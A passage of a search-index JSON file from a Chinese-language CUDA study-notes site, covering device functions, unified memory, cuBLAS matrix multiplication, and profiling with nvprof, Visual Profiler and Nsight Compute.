0.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u4e3a\u4ec0\u4e48-__device__-\u51fd\u6570\u4e0d\u9700\u8981-","title":"\u4e3a\u4ec0\u4e48 <code>__device__</code> \u51fd\u6570\u4e0d\u9700\u8981 <code>&lt;&lt;&lt;...&gt;&gt;&gt;</code>","text":"<ul> <li><code>__device__</code> \u51fd\u6570\u672c\u8d28\u4e0a\u662f GPU \u4e0a\u7684\u4e00\u4e2a\u5b50\u7a0b\u5e8f\u6216\u51fd\u6570\u5e93\uff0c\u5b83\u4e0d\u80fd\u72ec\u7acb\u542f\u52a8\u3002</li> <li>\u5b83\u7684\u6267\u884c\u5b8c\u5168\u4f9d\u8d56\u4e8e\u8c03\u7528\u5b83\u7684\u51fd\u6570\uff0c\u6ca1\u6709\u81ea\u5df1\u7684\u6267\u884c\u914d\u7f6e\u3002</li> <li>\u5f53 <code>__global__</code> \u51fd\u6570\u88ab\u542f\u52a8\u65f6\uff0cCUDA \u8fd0\u884c\u65f6\u73af\u5883\u4f1a\u8d1f\u8d23\u4e3a\u5b83\u5206\u914d\u7ebf\u7a0b\u8d44\u6e90\uff0c\u5e76\u7ba1\u7406\u5b83\u7684\u6267\u884c\u3002</li> <li>\u5982\u679c <code>__global__</code> \u51fd\u6570\u8c03\u7528\u4e86 <code>__device__</code> \u51fd\u6570\uff0c\u90a3\u4e48 <code>__device__</code> \u51fd\u6570\u4f1a\u5728 <code>__global__</code> \u51fd\u6570\u7684\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\uff0c\u65e0\u9700\u989d\u5916\u7684\u914d\u7f6e\u3002</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u7edf\u4e00\u5185\u5b58\u6a21\u578b","title":"\u7edf\u4e00\u5185\u5b58\u6a21\u578b","text":"<p>\u5728 CUDA \u7f16\u7a0b\u4e2d\uff0c<code>__managed__</code> \u662f\u4e00\u4e2a CUDA \u6269\u5c55\u5173\u952e\u5b57\uff0c\u7528\u4e8e\u6807\u8bc6\u88ab\u4fee\u9970\u7684\u53d8\u91cf\u6216\u6570\u636e\u7ed3\u6784\u5c06\u5728\u4e3b\u673a\uff08CPU\uff09\u548c\u8bbe\u5907\uff08GPU\uff09\u4e4b\u95f4\u81ea\u52a8\u8fdb\u884c\u5185\u5b58\u7ba1\u7406\u3002\u5b83\u662f CUDA Unified Memory \u529f\u80fd\u7684\u4e00\u90e8\u5206\uff0c\u65e8\u5728\u7b80\u5316\u4e3b\u673a\u548c\u8bbe\u5907\u4e4b\u95f4\u7684\u5185\u5b58\u7ba1\u7406\u548c\u6570\u636e\u4f20\u8f93\u3002</p> <p>\u901a\u8fc7\u4f7f\u7528 <code>__managed__</code> \u5173\u952e\u5b57\uff0c\u60a8\u53ef\u4ee5\u5c06\u53d8\u91cf\u6216\u6570\u636e\u7ed3\u6784\u58f0\u660e\u4e3a\u7edf\u4e00\u5185\u5b58\uff08Unified Memory\uff09\u3002\u8fd9\u610f\u5473\u7740\u5728\u4f7f\u7528\u8fd9\u4e9b\u7edf\u4e00\u5185\u5b58\u5bf9\u8c61\u65f6\uff0c\u65e0\u9700\u663e\u5f0f\u5730\u5728\u4e3b\u673a\u548c\u8bbe\u5907\u4e4b\u95f4\u8fdb\u884c\u624b\u52a8\u5185\u5b58\u5206\u914d\u548c\u6570\u636e\u4f20\u8f93\u3002CUDA \u8fd0\u884c\u65f6\u7cfb\u7edf\u4f1a\u81ea\u52a8\u5904\u7406\u5185\u5b58\u7684\u5206\u914d\u548c\u8fc1\u79fb\uff0c\u4ee5\u786e\u4fdd\u6570\u636e\u5728\u4e3b\u673a\u548c\u8bbe\u5907\u4e4b\u95f4\u6b63\u786e\u5171\u4eab\u3002</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u540c\u6b65","title":"\u540c\u6b65","text":"<p>cuda - Does __syncthreads() synchronize all threads in the grid? - Stack Overflow</p> <pre><code>__syncthreads()  // \u8be5\u51fd\u6570\u540c\u6b65block\u5185\u7ebf\u7a0b\uff08\u5b9e\u9645\u662fwarp\uff0cwarp\u5185\u7ebf\u7a0b\u6267\u884c\u7684\u662f\u76f8\u540c\u6307\u4ee4\uff0c\u672c\u8eab\u5c31\u662f\u540c\u6b65\u7684\uff09\n</code></pre> <ul> <li>cudaDeviceSynchronize<ul> <li>CPU \u7b49\u5f85 GPU \u5b8c\u6210 kernel \u8c03\u7528</li> </ul> </li> </ul> <p>CUDA \u6ca1\u6709\u5168\u5c40\u540c\u6b65\uff08block \u95f4\u540c\u6b65\uff09</p> <ul> <li>\u5bf9\u4e8e SM \u6570\u91cf\u5f88\u5927\u7684 GPU\uff0c\u786c\u4ef6\u6210\u672c\u592a\u9ad8</li> <li>would force programmer to run fewer blocks (no more than # multiprocessors * # resident blocks / multiprocessor) to avoid deadlock, which may reduce overall efficiency \u89e3\u51b3\u529e\u6cd5\uff1a \u5206\u89e3\u4e3a\u591a\u4e2a kernel</li> <li>kernel launch \u4f5c\u4e3a global sync point</li> <li>kernel launch has negligible HW overhead, low SW overhead</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cublas","title":"cuBLAS","text":"<p>\u8ba1\u7b97\u77e9\u9635 A x B \u65b9\u5f0f\u4e00\uff1a</p> <pre><code>cublasSgemm (blas_handle, CUBLAS_OP_T, CUBLAS_OP_T,   //CUBLAS\u4f7f\u7528\u5217\u4f18\u5148\u5b58\u50a8\u3002CUBLAS_OP_T\u8868\u793a\u8fdb\u884c\u8f6c\u7f6e\uff0c\u5373\u884c\u4f18\u5148\u3002\u5217\u4f18\u5148\u4e0bleading dimesion\u4e3am(mxn\u77e9\u9635)\n                     m, n, k,\n                     &amp;alpha,\n                     d_A, k, d_B, n,\n                     &amp;beta,\n                     d_C, n); //\u7ed3\u679c\u4ecd\u4e3a\u5217\u4f18\u5148\uff0c\u6545\u8ba1\u7b97\u5f97\u5230C\u7684\u8f6c\u7f6e\n</code></pre> <p>\u65b9\u5f0f\u4e8c\uff1a</p> <pre><code>/* \u901a\u8fc7\u8ba1\u7b97B^T * A^T\u5f97\u5230C^T\uff0c\u7531\u4e8e\u5217\u4f18\u5148\u6240\u6709d_C\u5b9e\u9645\u4e3aC\u7684\u884c\u4f18\u5148\u7ed3\u679c\u3002 //https://stackoverflow.com/a/56064726\n        \u7591\u95ee\uff1a\u8fd9\u91ccbeta\u7b49\u4e8e0\uff0c\u6545C\u7684\u521d\u59cb\u503c\u6ca1\u6709\u5f71\u54cd\uff0c\u884c\u5217\u4f18\u5148\u5747\u53ef\uff08ldc=m, n\u5747\u6b63\u786e\uff09\u3002\u4f46\u662f\u5982\u679c\u975e0\uff0c\u90a3\u4e48\u5982\u4f55\u5904\u7406\u5462\uff1f\n        */\n        cublasSgemm(blas_handle, CUBLAS_OP_N, CUBLAS_OP_N,\n                    n, m, k,\n                    &amp;alpha,\n                    d_B, n, d_A, k,\n                    &amp;beta,\n                    d_C, n);\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u5de5\u5177","title":"\u5de5\u5177","text":"<ul> <li>IDE/debug/profile\u5de5\u5177\u9884\u89c8\uff1aNVIDIA Developer Tools Overview | NVIDIA Developer</li> </ul> <p>Which tools are available on which GPU architectures</p> <p>Which tools are available on which GPU architectures</p> GPU architecture Visual Profiler and nvprof Nsight Systems Nsight Compute Maxwell Yes No No Pascal Yes Yes No Volta Yes Yes Yes Turing Yes* Yes Yes Ampere and later GPU architectures No Yes Yes <p>nsight sytem</p> <ul> <li>high level</li> </ul> <p>nsight compute</p> <ul> <li>detailed</li> <li>performance metrics</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvprof","title":"nvprof","text":"<p>The\u00a0Visual Profiler\u00a0is a graphical profiling tool that displays a timeline of your application\u2019s CPU and GPU activity, and that includes an automated analysis engine to identify optimization opportunities. The\u00a0nvprof\u00a0profiling tool enables you to collect and view profiling data from the command-line.</p> <p>Note that Visual Profiler and nvprof will be deprecated in a future CUDA release.\u00a0The NVIDIA Volta platform is the last architecture on which these tools are fully supported. It is recommended to use next-generation tools\u00a0NVIDIA Nsight Systems\u00a0for GPU and CPU sampling and tracing and\u00a0NVIDIA Nsight Compute\u00a0for GPU kernel profiling.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#visual-profilernvvp","title":"Visual Profiler/nvvp","text":"<p>NVIDIA Visual Profiler | NVIDIA Developer</p> <p>https://docs.nvidia.com/cuda/profiler-users-guide/index.html#visual-profiler</p> <p>The Visual Profiler is available as both a standalone application and as part of Nsight Eclipse Edition. The standalone version of the Visual Profiler,\u00a0<code>nvvp</code>, is included in the CUDA Toolkit for all supported OSes except for macOS.</p> <p>\u6b65\u9aa4</p> <ul> <li>\u5b89\u88c5\u8bbe\u7f6e 1.8 JRE</li> <li>Preparing An Application For Profiling</li> <li>create session: A session contains the settings, data, and profiling results associated with your application. Each session is saved in a separate file; so you can delete, move, copy, or share a session by simply deleting, moving, copying, or sharing the session file. By convention, the file extension\u00a0<code>.nvvp</code>\u00a0is used for Visual Profiler session files.</li> <li>analyziing</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#java-\u7248\u672c","title":"java \u7248\u672c","text":"<p>\u9700\u8981 Java Runtime Environment (JRE) 1.8 \u53ef\u4ee5\u542f\u52a8\u65f6\u901a\u8fc7 vm \u6307\u5b9a</p> <pre><code>nvvp -vm /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u5168\u5c40 java \u7248\u672c <code>update-alternatives</code> \u662f\u4e00\u4e2a Debian \u7cfb\u7edf\u4e2d\u7528\u4e8e\u7ba1\u7406\u591a\u4e2a\u8f6f\u4ef6\u7248\u672c\u7684\u5de5\u5177\u3002\u901a\u8fc7\u5b83\uff0c\u4f60\u53ef\u4ee5\u8f7b\u677e\u5207\u6362\u9ed8\u8ba4\u4f7f\u7528\u7684 Java \u7248\u672c</p> <pre><code>sudo update-alternatives --config java\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#ioexception-locking-file","title":"IOException: locking file","text":"<pre><code>(base) fyyuan@snode6 \u279c  ~ nvvp -vm /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java\njava.lang.RuntimeException: Error initializing storage.\n        at org.eclipse.osgi.internal.framework.EquinoxContainer.&lt;init&gt;(EquinoxContainer.java:77)\n        at org.eclipse.osgi.launch.Equinox.&lt;init&gt;(Equinox.java:31)\n        at org.eclipse.core.runtime.adaptor.EclipseStarter.startup(EclipseStarter.java:295)\n        at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:231)\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:648)\n        at org.eclipse.equinox.launcher.Main.basicRun(Main.java:603)\n        at org.eclipse.equinox.launcher.Main.run(Main.java:1465)\n        at org.eclipse.equinox.launcher.Main.main(Main.java:1438)\nCaused by: java.io.IOException: An error occurred while locking file \"/staff/fyyuan/.eclipse/org.eclipse.platform_4.4.1_868875438_linux_gtk_x86_64/configuration/org.eclipse.osgi/.manager/.fileTableLock\": \"Input/output error\". A common reason is that the file system or Runtime Environment does not support file locking for that location. Please choose a different location, or disable file locking by passing \"-Dosgi.locking=none\" as a VM argument.\n        at org.eclipse.osgi.internal.location.Locker_JavaNio.lock(Locker_JavaNio.java:49)\n        at org.eclipse.osgi.storagemanager.StorageManager.lock(StorageManager.java:388)\n        at org.eclipse.osgi.storagemanager.StorageManager.open(StorageManager.java:701)\n        at org.eclipse.osgi.storage.Storage.getChildStorageManager(Storage.java:1747)\n        at org.eclipse.osgi.storage.Storage.getInfoInputStream(Storage.java:1764)\n        at org.eclipse.osgi.storage.Storage.&lt;init&gt;(Storage.java:124)\n        at org.eclipse.osgi.storage.Storage.createStorage(Storage.java:84)\n        at org.eclipse.osgi.internal.framework.EquinoxContainer.&lt;init&gt;(EquinoxContainer.java:75)\n        ... 11 more\n</code></pre> <p>\u63d0\u793a\u7684\u6dfb\u52a0 vm \u53c2\u6570\u65b9\u6cd5\uff0c\u6dfb\u52a0\u5230 cuda-tookit-dir/libnvvp/nvvp.ini \u7ed3\u5c3e\uff08\u4f7f\u7528-vmargs \u6307\u5b9a\uff09</p> <pre><code>sudo vim /usr/local/cuda-11.8/libnvvp/nvvp.ini\n\n-startup\nplugins/org.eclipse.equinox.launcher_1.3.0.v20140415-2008.jar\n--launcher.library\nplugins/org.eclipse.equinox.launcher.gtk.linux.x86_64_1.1.200.v20140603-1326\n-data\n@noDefault\n-vmargs\n-Dosgi.locking=none\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#pc-sample-view","title":"PC sample View","text":"<ul> <li>compute_52 \u652f\u6301 PC \u91c7\u6837\u3002<ul> <li>PC and state of warp are sampled at regular interval for one of the active warps per SM</li> <li>The warp state indicates if that warp issued an instruction in a cycle or why it was stalled and could not issue an instruction</li> <li>Hence the stall for the sampled warp need not necessarily indicate that there is a hole in the instruction issue pipeline.</li> </ul> </li> <li>compute_60 \u652f\u6301\u00a0latency reasons<ul> <li>While collecting these samples, there is no instruction issued in the respective warp scheduler and hence these give the latency reasons.</li> </ul> </li> </ul> <p>6.0 \u4ee5\u4e0a\u8bbe\u5907\uff0cVisual Profiler show two views: \u2018Kernel Profile - PC Sampling\u2019which gives the warp state view and\u2018Kernel Profile - PC Sampling - Latency\u2019which gives the latency reasons.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#memory-\u7edf\u8ba1","title":"memory \u7edf\u8ba1","text":"<ul> <li>The data paths from the SMs to the memory spaces (Global, Local, Texture, Surface and Shared) report the total number of memory instructions executed, it includes both read and write operations.</li> <li>The data path between memory spaces and \u201cUnified Cache\u201d or \u201cShared Memory\u201d reports the total amount of memory requests made.</li> <li>All other data paths report the total amount of transferred memory in bytes.</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#source-disassembly","title":"source-disassembly","text":"<p><code>-lineinfo</code></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#warp-statestall\u539f\u56e0","title":"Warp state/stall\u539f\u56e0","text":"<p>1. Preparing An Application For Profiling \u2014 Profiler 12.3 documentation (nvidia.com)</p> <p>https://docs.nvidia.com/cuda/profiler-users-guide/index.html#warp-state</p> <p>\u80fd\u591f\u5bf9\u5e94\u5230\u6e90\u7801\u8fdb\u884c\u5206\u6790\uff1aCUDA 7.5: Pinpoint Performance Problems with Instruction-Level Profiling | NVIDIA Technical Blog</p> <p></p> <ul> <li>Instruction issued</li> <li>Stalled<ul> <li>Stalled for instruction fetch<ul> <li>For very short kernels, consider fusing into a single kernels.</li> </ul> </li> <li>Stalled for execution dependency</li> <li>Stalled for memory dependency<ul> <li>\u5c1d\u8bd5\u63d0\u9ad8\u5185\u5b58\u5408\u5e76\u548c/\u6216\u83b7\u53d6\u5b57\u8282\u7684\u6548\u7387\uff08\u5bf9\u9f50\u7b49\uff09\u3002\u4f7f\u7528 gld_efficiency \u548c gst_efficiency \u68c0\u67e5\u672a\u5408\u5e76\u7684\u5185\u5b58\u8bbf\u95ee</li> <li>memory-level parallelism (MLP): the number of independent memory operations in flight per thread. Loop unrolling, loading vector types such as float4, and processing multiple elements per thread are all ways to increase memory-level parallelism.</li> <li>\u8bf7\u8003\u8651\u5c06\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\u79fb\u52a8\u5230\u66f4\u9760\u8fd1 SM \u7684\u4f4d\u7f6e\uff0c\u4f8b\u5982\u4f7f\u7528\u5171\u4eab\u5185\u5b58\u6216\u53ea\u8bfb\u6570\u636e\u7f13\u5b58\u3002</li> <li>\u8003\u8651\u5c3d\u53ef\u80fd\u91cd\u65b0\u8ba1\u7b97\u6570\u636e\uff0c\u800c\u4e0d\u662f\u4ece\u8bbe\u5907\u5185\u5b58\u52a0\u8f7d\u6570\u636e</li> <li>\u5982\u679c\u672c\u5730\u5185\u5b58\u8bbf\u95ee\u91cf\u5f88\u9ad8\uff0c\u8bf7\u8003\u8651\u589e\u52a0\u6bcf\u4e2a\u7ebf\u7a0b\u7684\u5bc4\u5b58\u5668\u8ba1\u6570\u4ee5\u51cf\u5c11\u6ea2\u51fa\uff0c\u5373\u4f7f\u4ee5\u5360\u7528\u7387\u4e3a\u4ee3\u4ef7</li> </ul> </li> <li>Stalled for memory throttle</li> <li>Stalled for texture</li> <li>Stalled for sync</li> <li>Stalled for constant memory dependency</li> <li>Stalled for pipe busy\uff1afunctional unit busy</li> <li>Stalled for not selected\uff1aWarp \u5df2\u51c6\u5907\u5c31\u7eea\uff0c\u4f46\u6ca1\u6709\u673a\u4f1a\u53d1\u51fa\uff0c\u56e0\u4e3a\u9009\u62e9\u4e86\u5176\u4ed6\u4e00\u4e9b Warp \u8fdb\u884c\u53d1\u51fa\u3002</li> <li>Stalled for other\uff1aWarp \u56e0\u4e0d\u5e38\u89c1\u7684\u539f\u56e0\uff08\u5982\u7f16\u8bd1\u5668\u6216\u786c\u4ef6\u539f\u56e0\uff09\u800c\u88ab\u963b\u6b62\u3002\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u63a7\u5236\u8fd9\u4e9b stall\u3002</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvprof_1","title":"nvprof","text":"<ul> <li>Summary Mode<ul> <li>\u9ed8\u8ba4\u6a21\u5f0f\uff0c<code>nvprof</code>\u00a0outputs a single result line for each kernel function and each type of CUDA memory copy/set performed by the application.</li> <li>\u5982\u679c\u4e0d\u9700\u8981\uff0c\u53ef\u4ee5\u4f7f\u7528 \u5173\u95ed API \u8ddf\u8e2a\u00a0<code>--profile-api-trace\u00a0none</code>\u00a0\u3002\u8fd9\u51cf\u5c11\u4e86\u4e00\u4e9b\u6027\u80fd\u5206\u6790\u5f00\u9500\uff0c\u5c24\u5176\u662f\u5728\u5185\u6838\u8f83\u77ed\u65f6\u3002</li> </ul> </li> <li>gpu-trace<ul> <li>GPU-Trace mode provides a timeline of all activities taking place on the GPU in chronological order.</li> <li>\u6309\u7167\u65f6\u95f4\u987a\u5e8f\u663e\u793a\u3002\u540c\u4e00\u4e2a kernel \u4f1a\u591a\u6b21\u663e\u793a</li> <li><code>nvprof --print-gpu-trace matrixMul</code></li> </ul> </li> <li>API-trace: API-trace mode shows the timeline of all CUDA runtime and driver API calls invoked on the host in chronological order.<ul> <li>\u663e\u793a runtime \u548c driver API \u8c03\u7528</li> <li><code>nvprof --print-api-trace matrixMul</code></li> </ul> </li> <li>Event/metric Summary Mode<ul> <li><code>--events\u00a0all</code> <code>--metrics\u00a0all</code></li> </ul> </li> </ul> <p>An\u00a0event\u00a0is a countable activity, action, or occurrence on a device. It corresponds to a single hardware counter value which is collected during kernel execution. To see a list of all available events on a particular NVIDIA GPU, type\u00a0<code>nvprof\u00a0--query-events</code>.</p> <p>A\u00a0metric\u00a0is a characteristic of an application that is calculated from one or more event values. To see a list of all available metrics on a particular NVIDIA GPU, type\u00a0<code>nvprof\u00a0--query-metrics</code>. You can also refer to the\u00a0metrics reference\u00a0.</p> <p>\u9009\u9879\uff1a(https://docs.nvidia.com/cuda/profiler-users-guide/#command-line-options)</p> <p><code>Usage: nvprof [options] [application] [application-arguments]</code></p> <pre><code>--analysis-metrics\n                        Collect profiling data that can be imported to Visual Profiler's\n                        \"analysis\" mode. Note: Use \"--export-profile\" to specify\n                        an export file.\n\n--devices &lt;device ids&gt;\n                        Change the scope of subsequent \"--events\", \"--metrics\", \"--query-events\"\n                        and \"--query-metrics\" options.\n                        Allowed values:\n                                all - change scope to all valid devices\n                                comma-separated device IDs - change scope to specified\n                        devices\n\n  -e,  --events &lt;event names&gt;\n                        Specify the events to be profiled on certain device(s). Multiple\n                        event names separated by comma can be specified. Which device(s)\n                        are profiled is controlled by the \"--devices\" option. Otherwise\n                        events will be collected on all devices.\n                        For a list of available events, use \"--query-events\".\n                        Use \"--events all\" to profile all events available for each\n                        device.\n                        Use \"--devices\" and \"--kernels\" to select a specific kernel\n                        invocation.\n --kernels &lt;kernel path syntax&gt;\n                        Change the scope of subsequent \"--events\", \"--metrics\" options.\n                        The syntax is as follows:\n                                &lt;kernel name&gt;\n                                Limit scope to given kernel name.\n                        or\n                                &lt;context id/name&gt;:&lt;stream id/name&gt;:&lt;kernel name&gt;:&lt;invocation&gt;\n                        The context/stream IDs, names, kernel name and invocation\n                        can be regular expressions. Empty string matches any number\n                        or characters. If &lt;context id/name&gt; or &lt;stream id/name&gt;\n                        is a positive number, it's strictly matched against the\n                        CUDA context/stream ID. Otherwise it's treated as a regular\n                        expression and matched against the context/stream name specified\n                        by the NVTX library. If the invocation count is a positive\n                        number, it's strictly matched against the invocation of\n                        the kernel. Otherwise it's treated as a regular expression.\n                        Example: --kernels \"1:foo:bar:2\" will profile any kernel\n                        whose name contains \"bar\" and is the 2nd instance on context\n                        1 and on stream named \"foo\".\n\n  -m,  --metrics &lt;metric names&gt;\n                        Specify the metrics to be profiled on certain device(s).\n                        Multiple metric names separated by comma can be specified.\n                        Which device(s) are profiled is controlled by the \"--devices\"\n                        option. Otherwise metrics will be collected on all devices.\n                        For a list of available metrics, use \"--query-metrics\".\n                        Use \"--metrics all\" to profile all metrics available for\n                        each device.\n                        Use \"--devices\" and \"--kernels\" to select a specific kernel\n                        invocation.\n                        Note: \"--metrics all\" does not include some metrics which\n                        are needed for Visual Profiler's source level analysis.\n                        For that, use \"--analysis-metrics\".\n\n --pc-sampling-period &lt;period&gt;\n                        Specify PC Sampling period in cycles,  at which the sampling\n                        records will be dumped. Allowed values for the period are\n                        integers between 5 to 31 both inclusive.\n                        This will set the sampling period to (2^period) cycles\n                        Default value is a number between 5 and 12 based on the setup.\n                        Note: Only available for GM20X+.\n\n --print-api-summary\n                  Print a summary of CUDA runtime/driver API calls.\n\n --print-api-trace\n                  Print CUDA runtime/driver API trace.\n\n --print-gpu-trace\n                        Print individual kernel invocations (including CUDA memcpy's/memset's)\n                        and sort them in chronological order. In event/metric profiling\n                        mode, show events/metrics for each kernel invocation.\n  -s,  --print-summary\n                        Print a summary of the profiling result on screen. Note:\n                        This is the default unless \"--export-profile\" or other print\n                        options are used.\n\n  -o,  --export-profile &lt;filename&gt;\n                        Export the result file which can be imported later or opened\n                        by the NVIDIA Visual Profiler.\n                                \"%p\" in the file name string is replaced with the\n                        process ID of the application being profiled.\n                                \"%q{&lt;ENV&gt;}\" in the file name string is replaced\n                        with the value of the environment variable \"&lt;ENV&gt;\". If the\n                        environment variable is not set it's an error.\n                                \"%h\" in the file name string is replaced with the\n                        hostname of the system.\n                                \"%%\" in the file name string is replaced with \"%\".\n                                Any other character following \"%\" is illegal.\n                        By default, this option disables the summary output. Note:\n                        If the application being profiled creates child processes,\n                        or if '--profile-all-processes' is used, the \"%p\" format\n                        is needed to get correct export files for each process.\n</code></pre> <p>metric \u5177\u4f53\u542b\u4e49\uff1a1. Preparing An Application For Profiling \u2014 Profiler 12.3 documentation (nvidia.com)</p> <p>The\u00a0Visual Profiler\u00a0is a graphical profiling tool that displays a timeline of your application\u2019s CPU and GPU activity, and that includes an automated analysis engine to identify optimization opportunities. The\u00a0nvprof\u00a0profiling tool enables you to collect and view profiling data from the command-line.</p> <p>\u4e0b\u4e00\u4ee3</p> <p>Note that Visual Profiler and nvprof will be deprecated in a future CUDA release.\u00a0The NVIDIA Volta platform is the last architecture on which these tools are fully supported. It is recommended to use next-generation tools\u00a0NVIDIA Nsight Systems\u00a0for GPU and CPU sampling and tracing and\u00a0NVIDIA Nsight Compute\u00a0for GPU kernel profiling.</p> <p>\u8fc1\u79fb\uff1a1. Preparing An Application For Profiling \u2014 Profiler 12.3 documentation (nvidia.com)</p> <ul> <li>An\u00a0event\u00a0is a countable activity, action, or occurrence on a device. It corresponds to a single hardware counter value which is collected during kernel execution. To see a list of all available events on a particular NVIDIA GPU, type\u00a0<code>nvprof\u00a0--query-events</code>.</li> <li>A\u00a0metric\u00a0is a characteristic of an application that is calculated from one or more event values. To see a list of all available metrics on a particular NVIDIA GPU, type\u00a0<code>nvprof\u00a0--query-metrics</code>. You can also refer to the\u00a0metrics reference\u00a0.</li> </ul> <p>\u652f\u6301 cudaProfilerStart, Stop CUDA API \u7528\u4e8e\u4e13\u6ce8\u90e8\u5206\u4ee3\u7801\u7684\u5206\u6790\u3002nvprof \u9700\u8981\u4f7f\u7528--profile-from-start\u00a0off \u6765\u4f7f\u7528</p> <p>NVTX \u7528\u4e8e\u7ed9 CPU \u4ee3\u7801\u6253\u4e0a\u6807\u8bb0\uff0c\u597d\u5728\u5de5\u5177\u91cc\u770b\u5230</p> <p>To understand what the application\u2019s CPU threads are doing outside of CUDA function calls, you can use the\u00a0NVIDIA Tools Extension API\u00a0(NVTX). When you add NVTX markers and ranges to your application, the\u00a0Timeline View\u00a0shows when your CPU threads are executing within those regions.</p> <p>The Visual Profiler is available as both a standalone application and as part of Nsight Eclipse Edition. The standalone version of the Visual Profiler,\u00a0<code>nvvp</code>, is included in the CUDA Toolkit for all supported OSes</p> <p>\u6d41\u7a0b</p> <ul> <li>\u51c6\u5907\u5e94\u7528\u7a0b\u5e8f<ul> <li>\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u4e0d\u7528\u4e13\u95e8\u4fee\u6539\u3002\u4f46\u662f\u4f7f\u7528 NVTX \u66f4\u597d</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nsight-compute","title":"Nsight Compute","text":"<p>Nsight Compute Documentation (nvidia.com)</p> <ul> <li>Kernel Profiling Guide<ul> <li>Kernel Profiling Guide with metric types and meaning, data collection modes and FAQ for common problems.</li> </ul> </li> <li>Nsight Compute<ul> <li>NVIDIA Nsight Compute User Interface (UI) manual. Information on all views, controls and workflows within the tool UI. Transitions guide for Visual Profiler.</li> </ul> </li> <li>Nsight Compute CLI<ul> <li>NVIDIA Nsight Compute Command Line Interface (CLI) manual. Information on workflows and options for the command line, including multi-process profiling and NVTX filtering. Transitions guide for Nvprof.</li> </ul> </li> </ul> <ul> <li>nvprof\uff1asm7.5 \u4e4b\u524d\u4f7f\u7528\uff0c\u88ab nsight compute \u66ff\u4ee3</li> <li>Nsight compute<ul> <li>\u56fe\u5f62\u5316\u754c\u9762</li> <li>\u547d\u4ee4\u884c\uff1ancu</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#ncu","title":"ncu","text":"<p>Nsight Compute CLI :: Nsight Compute Documentation (nvidia.com)</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#metric","title":"metric","text":"<p>--metric</p> <p>Specify all metrics to be profiled, 